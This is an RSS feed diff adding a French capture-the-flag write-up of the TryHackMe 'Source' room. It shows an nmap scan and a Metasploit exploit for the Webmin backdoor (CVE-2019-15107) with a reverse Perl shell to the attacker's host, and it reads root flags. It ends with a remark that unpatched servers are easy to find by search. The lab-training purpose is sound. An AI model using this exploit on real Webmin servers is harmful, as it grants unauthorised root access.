@@ -6,8 +6,79 @@
         <generator>Hugo -- gohugo.io</generator>
         <language>en-us</language>
         <copyright>&lt;a href=&#34;https://creativecommons.org/licenses/by-nc/4.0/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;CC BY-NC 4.0&lt;/a&gt;</copyright>
-        <lastBuildDate>Thu, 09 Jul 2020 00:12:57 +0200</lastBuildDate>
+        <lastBuildDate>Thu, 09 Jul 2020 17:06:50 +0200</lastBuildDate>
         <atom:link href="https://blog.hugoblanc.com/posts/index.xml" rel="self" type="application/rss+xml" />
+        
+        <item>
+            <title>Write-up | Source</title>
+            <link>https://blog.hugoblanc.com/posts/source-writeup/</link>
+            <pubDate>Thu, 09 Jul 2020 17:06:50 +0200</pubDate>
+            
+            <guid>https://blog.hugoblanc.com/posts/source-writeup/</guid>
+            <description>Ce write-up sera consacré à la room Source, sur Try Hack Me.
+Synopsis :
+ Exploit a recent vulnerability and hack Webmin, a web-based system configuration tool.
+ Reconnaissance Premier scan de ports avec nmap :
+$ nmap -sV -sC 10.10.119.71 -oN scans/ports.txt PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 b7:4c:d0:bd:e2:7b:1b:15:72:27:64:56:29:15:ea:23 (RSA) | 256 b7:85:23:11:4f:44:fa:22:00:8e:40:77:5e:cf:28:7c (ECDSA) |_ 256 a9:fe:4b:82:bf:89:34:59:36:5b:ec:da:c2:d3:95:ce (ED25519) 2718/tcp filtered pn-requester2 10000/tcp open http MiniServ 1.</description>
+            <content type="html"><![CDATA[<p>Ce write-up sera consacré à la room Source, sur <a href="https://tryhackme.com">Try Hack Me</a>.</p>
+<p>Synopsis :</p>
+<blockquote>
+<p>Exploit a recent vulnerability and hack Webmin, a web-based system configuration tool.</p>
+</blockquote>
+<h2 id="reconnaissance">Reconnaissance</h2>
+<p>Premier scan de ports avec <code>nmap</code> :</p>
+<pre><code>$ nmap -sV -sC 10.10.119.71 -oN scans/ports.txt
+PORT      STATE    SERVICE       VERSION
+22/tcp    open     ssh           OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 b7:4c:d0:bd:e2:7b:1b:15:72:27:64:56:29:15:ea:23 (RSA)
+|   256 b7:85:23:11:4f:44:fa:22:00:8e:40:77:5e:cf:28:7c (ECDSA)
+|_  256 a9:fe:4b:82:bf:89:34:59:36:5b:ec:da:c2:d3:95:ce (ED25519)
+2718/tcp  filtered pn-requester2
+10000/tcp open     http          MiniServ 1.890 (Webmin httpd)
+|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</code></pre><p>Pas de serveur web sur le port 80, mais il y a un service que je ne connais pas sur le port 10000, vu le nom du service il est possible que ça soit un serveur web.
+En allant sur la page je vois le message :</p>
+<pre><code>This web server is running in SSL mode. 
+</code></pre><p>J&rsquo;essaie donc en https et tombe sur une page de connection du service Webmin.
+Après une recherche rapide, il semblerait qu&rsquo;il y ai une vulnérabilité assez sévère sur les versions de Webmin &lt; 1.920.</p>
+<h2 id="exploitation">Exploitation</h2>
+<p>Un module <code>metasploit</code> est disponible pour cette vulnérabilité, je vais l&rsquo;utiliser.</p>
+<pre><code>msf5 &gt; use exploit/linux/http/webmin_backdoor
+[*] Using configured payload cmd/unix/reverse_perl
+msf5 exploit(linux/http/webmin_backdoor) &gt; set lhost 10.8.37.193
+lhost =&gt; 10.8.37.193
+msf5 exploit(linux/http/webmin_backdoor) &gt; set rhost 10.10.119.71
+rhost =&gt; 10.10.119.71
+msf5 exploit(linux/http/webmin_backdoor) &gt; set ssl true
+[!] Changing the SSL option's value may require changing RPORT!
+ssl =&gt; true
+msf5 exploit(linux/http/webmin_backdoor) &gt; exploit
+</code></pre><p>Il faut penser à mettre l&rsquo;option SSL à true.</p>
+<p>Une fois connecté, je commence par regarder qui je suis :</p>
+<pre><code>whoami
+root
+</code></pre><p>:)</p>
+<p>Je regarde ensuite le contenu du <code>/home</code>, et enfin lire le flag utilisateur :</p>
+<pre><code>whoami
+root
+ls /home/dark
+user.txt
+webmin_1.890_all.deb
+cat /home/dark/user.txt
+THM{[edited]}
+</code></pre><p>puis le contenu de <code>/root/root.txt</code> :</p>
+<pre><code>cat /root/root.txt
+THM{[edited]}
+</code></pre><p>Voilà :)</p>
+<h2 id="détails-sur-la-vulnérabilité">Détails sur la vulnérabilité</h2>
+<p>La CVE associée à la vulnérabilité que j&rsquo;ai exploité est la <a href="https://www.cvedetails.com/cve/CVE-2019-15107/">CVE-2019-15107</a>.</p>
+<p>La version 1.890 a été publiée avec un backdoor qui n&rsquo;a pas été vu par les équipes de dévelopement. D&rsquo;après l&rsquo;<a href="http://www.webmin.com/exploit.html">article publié par Webmin</a> à ce sujet, leur serveur de developement a été compromis, et l&rsquo;attaquant a ajouté au script <code>password_change.cgi</code> une vulnérabilité. Le timestamp du fichier a été modifié pour pas que ce changement apparaisse avec la commande <code>git diff</code>. Il a été patché quelques temps plus tard mais l&rsquo;attaquant a pu re-modifier la version 1.900. Webmin est donc définitivement patché pour cette vulnérabilité à partir de la version 1.930.</p>
+<p>Au vu de la difficulté, je pense que cette room était surtout pour faire une démonstration de l&rsquo;importance des mises à jour :)</p>
+<p>Je suis sûr qu&rsquo;avec de simples google dorks, on peut trouver une floppée de serveurs Webmin non patchés.</p>
+]]></content>
+        </item>
         
         <item>
             <title>Write-up | Anonforce</title>
